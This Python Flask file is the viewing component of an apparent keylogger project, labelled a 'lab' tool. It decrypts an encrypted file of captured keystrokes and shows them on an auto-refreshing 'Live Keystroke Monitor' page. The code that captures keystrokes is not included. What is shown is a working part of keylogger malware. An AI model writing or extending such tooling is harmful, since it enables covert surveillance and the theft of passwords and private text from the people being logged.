from flask import Flask, render_template_string
import os
import sys

# Add current directory to path
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

# Now import project modules
from utils.encryption import decrypt
from config import ENC_LOG_FILE

app = Flask(__name__)


@app.route("/")
def view_logs():
    logs = []
    if os.path.exists(ENC_LOG_FILE):
        with open(ENC_LOG_FILE, "r") as f:
            for line in f:
                line = line.strip()
                try:
                    logs.append(decrypt(line))
                except Exception:
                    logs.append("[Error decrypting line]")
    html = """
    <html>
    <head>
        <title>Lab Keylogger Dashboard</title>
        <meta http-equiv="refresh" content="5" />
        <style>
            body { font-family: monospace; background: #111; color: #0f0; padding: 2em; }
            h1 { color: #fff; }
        </style>
    </head>
    <body>
        <h1>Live Keystroke Monitor</h1>
        <pre>{{ logs }}</pre>
    </body>
    </html>
    """
    return render_template_string(html, logs="\n".join(logs))


if __name__ == "__main__":
    print(f"Monitor running at http://localhost:5000")
    app.run(port=5000)
